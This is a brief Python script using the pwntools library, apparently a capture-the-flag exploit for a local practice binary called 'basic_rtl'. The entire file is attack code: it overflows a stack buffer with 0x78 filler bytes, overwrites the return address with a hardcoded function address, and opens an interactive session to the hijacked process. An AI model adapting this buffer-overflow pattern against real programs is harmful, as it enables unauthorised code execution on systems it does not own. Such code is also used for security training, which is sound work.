from pwn import *

p = process('./basic_rtl')

payload = "A"*(0x70+8)
payload += p64(0x0000000000400686)

p.sendline(payload)
p.interactive()